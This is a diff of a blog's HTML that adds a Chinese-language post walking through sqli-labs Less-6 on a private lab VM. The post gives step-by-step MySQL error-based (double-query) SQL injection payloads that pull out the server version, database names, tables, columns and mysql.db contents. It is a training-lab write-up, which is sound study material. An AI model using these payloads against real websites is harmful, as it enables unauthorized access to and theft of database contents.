@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>Archives: 2016/5 | 大棟哥の博客</title>
+  <title>sqli-6 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -84,7 +84,7 @@
 </head>
 
 <!--
-<body class="home-template">
+<body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
 
@@ -254,55 +254,69 @@
 
         <!-- ============================ END Hero Image =========================== -->
       
-
-
-<section id="services">
+<section id="intro">
     <div class="container">
-        <div class="row">
-            <div class="col-md-10 col-md-offset-1">
-                <div class="row boxes">
-                    
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/05/29/PHP-array-data-structure/">PHP array data structure</a></h4>
-                            
-                            <p><time datetime="2016-05-29T12:59:54.000Z"><a href="/2016/05/29/PHP-array-data-structure/">2016-05-29</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/05/15/TCP-IP-data-transport/">TCP/IP data transport</a></h4>
-                            
-                            <p><time datetime="2016-05-15T15:08:25.000Z"><a href="/2016/05/15/TCP-IP-data-transport/">2016-05-15</a></time></p>
-                        </div>
-                    
-                        
-                        
-                        <div class="col-xs-12 col-sm-3 col-md-3 col-lg-3 wow fadeInUp" data-wow-delay="0.3s">
-                            
-                              <h4 class="title"><a href="/2016/05/10/PHP-LEARNING/">Process Control</a></h4>
-                            
-                            <p><time datetime="2016-05-10T12:27:20.000Z"><a href="/2016/05/10/PHP-LEARNING/">2016-05-10</a></time></p>
-                        </div>
-                    
-                </div>
-            </div>    
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2016-07-09T12:28:41.000Z" itemprop="datePublished">
+          2016-07-09
+      </time>
+    
+    
+    | 
+    <a href='/tags/error/'>error</a>
+    
+    
+</span>
+                <h1>sqli-6</h1>
+            </div>
         </div>
-    </div>
-</section> 
+        <div class="col-md-8 col-md-offset-2">
+      		<p>0x00.实验环境：centos上搭建的sqli实验环境，通过本机Firefox上的hackbar插件进行sql注入测试：<br>实验类型：报错注入<br>0x01.进入实验二界面：<br><a href="http://192.168.111.132/Less-6/" target="_blank" rel="external">http://192.168.111.132/Less-6/</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"></p>
+<p>0x02.按照提示输入参数：<br><a href="http://192.168.111.132/Less-6/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-6/?id=1</a><br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"></p>
+<p>0x03.爆版本:<br><a href="http://192.168.111.132/Less-6/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-6/?id=1</a>“<br>+and(select 1 from(select count(<em>),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%873.png?raw=true" alt="image"></p>
+<p>0x04.统计有几个库：<br><a href="http://192.168.111.132/Less-6/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-6/?id=1</a>“<br>+and(select 1 from(select count(<em>),concat((select (select (select count(distinct+table_schema) from information_schema.tables limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+</p>
+<p>0x05.有4个库<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%874.png?raw=true" alt="image"></p>
+<p>0x06.接下来爆库名：<br><a href="http://192.168.111.132/Less-6/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-6/?id=1</a>“<br>+and(select 1 from(select count(<em>),concat((select (select (select distinct+concat(table_schema) from information_schema.tables limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br>爆第二个数据库：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%875.png?raw=true" alt="image"></p>
+<p>0x07.爆表：<br><a href="http://192.168.111.132/Less-6/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-6/?id=1</a>“<br>+and(select 1 from(select count(<em>),concat((select (select (select distinct+concat(table_name) from information_schema.tables where table_schema=’mysql’ limit 1,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br>mysql库中第二个表为db表：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%876.png?raw=true" alt="image"></p>
+<p>0x08.爆字段：<br><a href="http://192.168.111.132/Less-6/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-6/?id=1</a>“<br>+and(select 1 from(select count(<em>),concat((select (select (select distinct+concat(column_name) from information_schema.columns where table_schema=’mysql’ and table_name=’db’ limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br>db表第一个字段为Host:<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%877.png?raw=true" alt="image"><br>字段Host里边的内容为%<br><a href="http://192.168.111.132/Less-6/?id=1" target="_blank" rel="external">http://192.168.111.132/Less-6/?id=1</a>“<br>+and(select 1 from(select count(<em>),concat((select (select (select distinct+concat(Host) from mysql.db limit 0,1)) from information_schema.tables limit 0,1),floor(rand(0)</em>2))x from information_schema.tables group by x)a) –+<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sqli-6/%E5%9B%BE%E7%89%878.png?raw=true" alt="image"><br>game over </p>
+<p>0x09.总结：<br>在报错注入中不能使用group_concat（），去重时distinct用在库和表 后边的limit一定要用！</p>
 
-<section id="statement">
-    <div class="container text-center wow fadeInUp" data-wow-delay="0.5s">
-        <div class="row">
-            <p>业精于勤，荒于嬉；行成于思，毁于随。</p>
+            <div class="clearfix"></div>
+            <hr class="nogutter">
         </div>
+        <nav class="pagination" role="pagination">
+    
+    <a class="pull-left" href="/2016/07/21/XSS01/" style="float: left;">
+        ← XSS实例1
+    </a>
+    
+    
+    <a class="pull-right" href="/2016/07/08/sqli-5/">
+        sqli-5 →
+    </a>
+    
+</nav>
+
+        <div class="duoshuo">
+<div class="ds-thread" data-thread-key="2016/07/09/sqli-6/" data-title="sqli-6" data-url="http://jiadong.xin/2016/07/09/sqli-6/"></div>
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"duoshuo_name"};
+(function() {
+	var ds = document.createElement('script');
+	ds.type = 'text/javascript';ds.async = true;
+	ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+	ds.charset = 'UTF-8';
+	(document.getElementsByTagName('head')[0] 
+	 || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+</div>
     </div>
 </section>
+
+
       
 <!-- ============================ Footer =========================== -->
 
